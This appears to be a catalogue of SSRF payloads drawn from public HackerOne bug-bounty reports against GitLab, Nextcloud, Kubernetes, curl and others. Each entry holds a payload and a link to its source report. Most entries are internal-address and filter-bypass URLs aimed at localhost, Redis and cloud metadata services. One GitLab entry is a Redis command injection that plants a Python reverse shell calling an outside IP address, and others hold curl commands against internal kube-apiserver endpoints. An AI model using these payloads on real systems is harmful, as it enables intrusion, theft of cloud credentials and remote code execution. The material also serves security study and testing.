— [SSRF on project import via the remote_attachment_url on a Note](https://hackerone.com/reports/826361) · GitLab · [vakzz](https://hackerone.com/vakzz) · $10,000.0


## SSRF to internal Redis endpoint with command injection via the hook[token] field

### `d26fb92d`

```
POST /root/test/hooks HTTP/1.1
Host: gitlab-instance
...
----------1282688597
Content-Disposition: form-data; name="hook[url]"

http://127.0.0.1:6379/
----------1282688597
Content-Disposition: form-data; name="hook[token]"

A
...
```

**Parameter:** `hook[token]`
— [Evaluating Ruby code by injecting Rescue job on the system_hook_push queue through web hook](https://hackerone.com/reports/299473) · GitLab · [jobert](https://hackerone.com/jobert) · $750.0


## SSRF to internal Redis using a git:// URL with Redis protocol commands (Redis command injection)

### `ceb2710d`

```
git://127.0.0.1:6379/
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|/usr/bin/python3 -c \\\\\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"118.89.198.146\\\",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);\\\\\'\').read\"],\"retry\":3,\"queue\":\"system_hoo
```

**Parameter:** `project[remote_mirrors_attributes][0][url]`
— [CRLF injection & SSRF in git:// protocal lead to arbitrary code execution](https://hackerone.com/reports/441090) · GitLab · [chromium1337](https://hackerone.com/chromium1337)


## SSRF to internal Redis via webhook URL

### `216b4f38`

```
http://127.0.0.1:6379/
```

— [Evaluating Ruby code by injecting Rescue job on the system_hook_push queue through web hook](https://hackerone.com/reports/299473) · GitLab · [jobert](https://hackerone.com/jobert) · $750.0


## SSRF to internal SSH service (127.0.0.1:2222) via jabber server parameter

### `97258d27`

```
127.0.0.1:2222
```

**Parameter:** `jabber_server`
— [Server Side Request Forgery in 'Jabber settings' in Admin Control Panel](https://hackerone.com/reports/1018568) · phpBB · [they](https://hackerone.com/they)


## SSRF via internal URL (http://127.0.0.1:8080) used as proxy target

### `e1b1470a`

```
http://127.0.0.1:8080
```

— [Hackyholidays CTF writeup](https://hackerone.com/reports/1065583) · h1-ctf · [xehle](https://hackerone.com/xehle)


## SSRF using internal URL with path after script to retrieve arbitrary file

### `f570e156`

```
http://192.168.1.157/info.php/test.html
```

— [SSRF - pivoting in the private LAN](https://hackerone.com/reports/1364797) · Concrete CMS · [adrian_t](https://hackerone.com/adrian_t)


## SSRF using IPv6 address embedding to reach internal IP

### `d67955dc`

```
https://target.com/api/web_resource/url?q=http://[0:0:0:0:0:ffff:127.0.0.1
```

**Parameter:** `q`
— [Bypass for blind SSRF #281950 and #287496](https://hackerone.com/reports/642675) · Infogram · [7001](https://hackerone.com/7001)


## SSRF using IPv6 loopback address "[::1]"

### `a495dcc4`

```
[::1]
```

— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)


## SSRF using an IPv6‑mapped IPv4 address to reach 127.0.0.1

### `56757a5b`

```
http://[0:0:0:0:0:ffff:127.0.0.1
```

— [SSRF protection bypass](https://hackerone.com/reports/736867) · Nextcloud · [foobar7](https://hackerone.com/foobar7) · $100.0


## SSRF via JSON body parameter 'link' pointing to target URL

### `f22abfde`

```
POST /pasteLinkToImage HTTP/1.1
Host: 3d.cs.money
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: application/json, text/plain, */*
Accept-Language: fi-FI,fi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 82
Origin: https://target.com
Connection: close
Referer: https://target.com/
Cookie: INSERT_PRIME_COOKIES_HERE

{"link":"http:/INSERT_TARGET_URL_HERE"}
```

**Parameter:** `link`
— [SSRF via 3d.cs.money/pasteLinkToImage](https://hackerone.com/reports/832858) · CS Money · [putsi](https://hackerone.com/putsi)


## SSRF via Kubernetes API debug flag to enable internal requests to localhost

### `22315853`

```
curl -XPUT --data "10" http://localhost:8001/debug/flags/v
```

— [SSRF for kube-apiserver cloudprovider scene](https://hackerone.com/reports/941178) · Kubernetes · [lazydog](https://hackerone.com/lazydog)


## SSRF using LF injection to break URL parsing and reach an internal host

### `fc07d832`

```
GET /help_docs?url=http://127.0.0.1:21/?%0Ahttps%3A%2F%2Ftarget.com%2Fmanual%2Faccount.html HTTP/1.1
    (snip)
```

**Parameter:** `url`
— [SSRF in target.com via ?url= parameter](https://hackerone.com/reports/514224) · GSA Bounty · [niwasaki](https://hackerone.com/niwasaki) · $150.0


## SSRF with LF injection to internal host on port 22

### `625f12ff`

```
GET /help_docs?url=http://127.0.0.1:22/?%0Ahttps%3A%2F%2Ftarget.com%2Fmanual%2Faccount.html HTTP/1.1
    (snip)
```

**Parameter:** `url`
— [SSRF in target.com via ?url= parameter](https://hackerone.com/reports/514224) · GSA Bounty · [niwasaki](https://hackerone.com/niwasaki) · $150.0


## SSRF to localhost via protocol‑relative URL

### `c1715f56`

```
//127.0.0.1
```

**Parameter:** `pathname`
— [\[CVE-2022-35949\]: undici.request vulnerable to SSRF using absolute / protocol-relative URL on pathname ](https://hackerone.com/reports/1663788) · Internet Bug Bounty · [haxatron1](https://hackerone.com/haxatron1)


## SSRF to a localhost service for port/status probing

### `e36b9443`

```
http://127.0.0.1:9090
```

— [GET /api/v2/url_info endpoint is vulnerable to Blind SSRF](https://hackerone.com/reports/1057531) · Automattic · [atc_h1h1](https://hackerone.com/atc_h1h1)


## SSRF to localhost service using supplied URL

### `3e6e10c5`

```
http://localhost:9222
```

— [\[h1-415 2020\] My writeup on how to retrieve the special secret document](https://hackerone.com/reports/776684) · h1-ctf · [blaklis](https://hackerone.com/blaklis)


## SSRF using a localhost URL

### `a0782c52`

```
http://localhost/
```

— [SSRF vulnerability in target.com via project import.](https://hackerone.com/reports/215105) · GitLab · [edoverflow](https://hackerone.com/edoverflow)


## SSRF via malicious HLS playlist (M3U) that forces the server's ffmpeg to fetch an external MP4 URL

### `05bb029c`

```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://target.com/2.mp4
#EXT-X-ENDLIST
```

— [SSRF and local file read in video to gif converter](https://hackerone.com/reports/115857) · Imgur · [sl1m](https://hackerone.com/sl1m)


## SSRF via malicious Referer header pointing to internal service

### `fc2604ef`

```
Referer: http://localhost:3000/
```

**Parameter:** `Referer`
— [\[h1-415 2020\] h1ctf{y3s_1m_c0sm1c_n0w}](https://hackerone.com/reports/781253) · h1-ctf · [pirateducky](https://hackerone.com/pirateducky)


## SSRF using malicious SMB URL scheme

### `3f847e65`

```
./build-poc/src/curl -u 'testuser:Password1' smb://127.0.0.1:4455/share/file.txt
```

**Parameter:** `url`
— [LM Challenge-Response Hash Always Sent in SMB Authentication](https://hackerone.com/reports/3584491) · curl · [brewm4ster](https://hackerone.com/brewm4ster)


## SSRF using a malicious URL that exploits DNS rebinding to reach 127.0.0.1

### `62cccbd9`

```
https://target.com/webhook5
```

**Parameter:** `url`
— [The endpoint '/test/webhooks' is vulnerable to DNS Rebinding](https://hackerone.com/reports/1379656) · Omise · [sim4n6](https://hackerone.com/sim4n6)


## SSRF with newline injection to send raw Redis commands (address payload)

### `91fb5e8c`

```
127.0.0.1:6379
```

— [Evaluating Ruby code by injecting Rescue job on the system_hook_push queue through web hook](https://hackerone.com/reports/299473) · GitLab · [jobert](https://hackerone.com/jobert) · $750.0


## SSRF payload consisting of a malicious external URL

### `7b61ecb9`

```
http://target.com.
```

— [Blind SSRF on target.com due to misconfigured sentry instance](https://hackerone.com/reports/756149) · Nord Security · [mase289](https://hackerone.com/mase289)


## SSRF payload pointing to the AWS metadata service URL

### `0fd3bd55`

```
http://169.254.169.254
```

— [Server Side Request Forgery mitigation bypass](https://hackerone.com/reports/632101) · GitLab · [mclaren650sspider](https://hackerone.com/mclaren650sspider)


## SSRF payload pointing to localhost URL

### `b734a31f`

```
http://127.0.0.1/
```

**Parameter:** `url`
— [SSRF In Get Video Contents](https://hackerone.com/reports/643622) · Semrush · [egoist233](https://hackerone.com/egoist233)


## SSRF via PlantUML !include remote URL

### `4c685ade`

```
@startuml
start
    :Do some stuff;
    !include http://169.254.169.254/
stop;
@enduml
```

— [SSRF In plantuml (on target.com)](https://hackerone.com/reports/689245) · GitLab · [plazmaz](https://hackerone.com/plazmaz)


## SSRF retrieving internal kube‑apiserver logs via localhost endpoint

### `c41e68c0`

```
curl http://localhost:8001/logs/target.com
```

— [SSRF for kube-apiserver cloudprovider scene](https://hackerone.com/reports/941178) · Kubernetes · [lazydog](https://hackerone.com/lazydog)


## SSRF by supplying arbitrary domain in URL path

### `f3c0f078`

```
https://target.com/evil.com/icon.png
```

— [Server-Side Request Forgery in "target.com"](https://hackerone.com/reports/913276) · Bitwarden · [njgadhiya](https://hackerone.com/njgadhiya)


## SSRF by supplying internal Google metadata hostname to bypass filters

### `ef04569f`

```
http://metadata.google.internal
```

— [SSRF via potential filter bypass with too lax local domain checking](https://hackerone.com/reports/1608039) · Nextcloud · [tomorrowisnew_](https://hackerone.com/tomorrowisnew_) · $250.0


## SSRF by supplying internal URL with path after script to bypass extension filter

### `51e612cf`

```
http://192.168.1.148/index.php/test.png
```

— [SSRF - pivoting in the private LAN](https://hackerone.com/reports/1364797) · Concrete CMS · [adrian_t](https://hackerone.com/adrian_t)


## SSRF targeting cloud metadata service (169.254.169.254)

### `6d89716e`

```
http://169.254.169.254/metadata/v1.json&type=embed
```

— [Bypass of SSRF Vulnerability](https://hackerone.com/reports/879803) · Node.js third-party modules · [njgadhiya](https://hackerone.com/njgadhiya)


## SSRF targeting Google Cloud metadata service at metadata.google.internal

### `319e5d79`

```
http://metadata.google.internal/
```

— [SSRF on project import via the remote_attachment_url on a Note](https://hackerone.com/reports/826361) · GitLab · [vakzz](https://hackerone.com/vakzz) · $10,000.0


## SSRF targeting localhost via URL

### `5c35bc12`

```
https://target.com/localhost/icon.png
```

— [Server-Side Request Forgery in "target.com"](https://hackerone.com/reports/913276) · Bitwarden · [njgadhiya](https://hackerone.com/njgadhiya)


## SSRF using a triple‑slash URL where the authority is empty, causing the host to be parsed as part of the path

### `d05ba2d2`

```
http:///169.254.169.254/latest/meta-data/
```

— [URL API: triple-slash parses path segment as hostname](https://hackerone.com/reports/3923212) · curl · [thinhlx](https://hackerone.com/thinhlx)


## SSRF using a URL with escaped slash and @ to target internal IP

### `925da67e`

```
http://169.254.169.254\/@geonode.target.com
```

— [Bypassing Whitelist to perform SSRF for internal host scanning](https://hackerone.com/reports/1747596) · U.S. Department of State · [imthatt](https://hackerone.com/imthatt)


## SSRF using a URL with escaped @ to target internal IP (metadata service)

### `495dfa06`

```
http://169.254.169.254\@geonode.target.com
```

— [Bypassing Whitelist to perform SSRF for internal host scanning](https://hackerone.com/reports/1747596) · U.S. Department of State · [imthatt](https://hackerone.com/imthatt)


## SSRF using a URL to localhost on port 22

### `3516dd08`

```
https://localhost:22
```

— [Server-Side Request Forgery on SAML Application - Import via URL](https://hackerone.com/reports/324005) · Ping Identity · [ziot](https://hackerone.com/ziot) · $450.0


## SSRF using a URL parameter pointing to an FTP:// resource causing the server to open a long‑lived FTP connection

### `3e687cc6`

```
https://target.com/vidgif/url?url=ftp://evil.com:12345/TEST
```

**Parameter:** `url`
— [SSRF in https://target.com/vidgif/url](https://hackerone.com/reports/115748) · Imgur · [aesteral](https://hackerone.com/aesteral)


## SSRF using URL pointing to 127.0.0.1

### `dc6c15aa`

```
https://127.0.0.1/else/internal
```

— [The endpoint '/test/webhooks' is vulnerable to DNS Rebinding](https://hackerone.com/reports/1379656) · Omise · [sim4n6](https://hackerone.com/sim4n6)


## SSRF via URL pointing to localhost port 25

### `1b7f372d`

```
http://localhost:25
```

— [SSRF/XSPA in target.com/dashboard/validate](https://hackerone.com/reports/272095) · GSA Bounty · [haxta4ok00](https://hackerone.com/haxta4ok00) · $300.0


## SSRF via the 'url' query parameter pointing to the AWS metadata service

### `077699a0`

```
https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/
```

**Parameter:** `url`
— [SSRF to read AWS metaData at https://█████/ \[HtUS\]](https://hackerone.com/reports/1624140) · U.S. Dept Of Defense · [rohsec](https://hackerone.com/rohsec) · $1,000.0


## SSRF via user-controlled iframe src URL in 'name' parameter

### `6222a05a`

```
The user 16 is now able to make a document conversion. The output document will contains an iframe with data from http://localhost:9222.

# Chrome debugger API opened

The Chrome debugger API is enabled and can be accessed through the SSRF from the previous step. There are both a Websocket API (complete) and a JSON API (limited) that allows to retrieve data from this interface.

By using the JSON api, hitting the */json/list* endpoint, we can see every tabs that are currently opened, with associ
```

**Parameter:** `name`
— [\[h1-415 2020\] My writeup on how to retrieve the special secret document](https://hackerone.com/reports/776684) · h1-ctf · [blaklis](https://hackerone.com/blaklis)


## Stored XSS via script src injection loading external JavaScript

### `207df1ce`

```
https://target.com/static/js/new.js
```

— [\[h1-415 2020\] SSRF in a headless chrome with remote debugging leads to sensible information leak](https://hackerone.com/reports/781295) · h1-ctf · [d1r3wolf](https://hackerone.com/d1r3wolf)
